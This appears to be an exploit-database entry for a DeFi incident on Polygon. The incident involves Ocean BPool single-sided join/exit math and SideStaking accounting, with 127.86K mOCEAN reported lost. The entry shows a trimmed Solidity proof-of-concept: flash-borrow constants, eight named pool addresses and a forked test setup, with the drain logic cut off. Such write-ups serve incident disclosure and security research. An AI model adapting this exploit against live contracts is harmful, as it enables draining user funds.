# [?] OceanBPoolSideStaking - BPool single-sided join/exit math with SideStaking gulp accounting

## Summary
Severity: Unknown
Chain: Polygon
Component: OceanBPoolSideStaking
Published: 2026-06-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/OceanBPoolSideStaking_exp.sol
Type: defi-exploit-poc

## Details
Lost: 127.86K mOCEAN

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 89_107_756;
    uint256 private constant MIN_MOCEAN_PROFIT = 120_000 ether;
    uint256 private constant FLASH_BORROW_BPS = 9_900;
    uint256 private constant BPS_DENOMINATOR = 10_000;
    uint256 private constant UNISWAP_FEE_NUMERATOR = 1_000;
    uint256 private constant UNISWAP_FEE_DENOMINATOR = 997;
    uint256 private constant MAX_DRAIN_STEPS = 16;

    IERC20 private constant mocean = IERC20(MOCEAN);
    IUniswapV2Pair private constant flashPair = IUniswapV2Pair(FLASH_PAIR);

    address[8] private pools = [
        0xe7832A036da14dC3BBcEc5F73a8193221E9F0DA5,
        0x2dd64bA8d9b9B1bB402Aa70214E1Fb1D7AF314a1,
        0x25faf893edCef3b1C94029f01a088448669fcB9a,
        0x1f5927CB77EA8449F0281ed14847A70d7A4f7053,
        0x56A5cf2fB3f5b12e6c4bC4C0f100800D3735E522,
        0x569C692125CF32bAF19E4ce713F9cf43e4c18c2C,
        0x95f57249e6DD394318025068a8BFC841ac6eC0DD,
        0x193F1cE9108644cD4d09C769d8DCD100F2B901D6
    ];

    function setUp() public {
        vm.createSelectFork("polygon", FORK_BLOCK);
        fundingToken = MOCEAN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack helper");
        vm.label(BPOOL_IMPLEMENTATION, "Ocean BPool implementation");
        vm.label(SIDE_STAKING, "Ocean SideStaking");
        vm.label(MOCEAN, "mOCEAN");
        vm.label(FLASH_PAIR, "mOCEAN flash pair");
        for (uint256 i; i < pools.length; ++i) {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/OceanBPoolSideStaking_exp.sol_
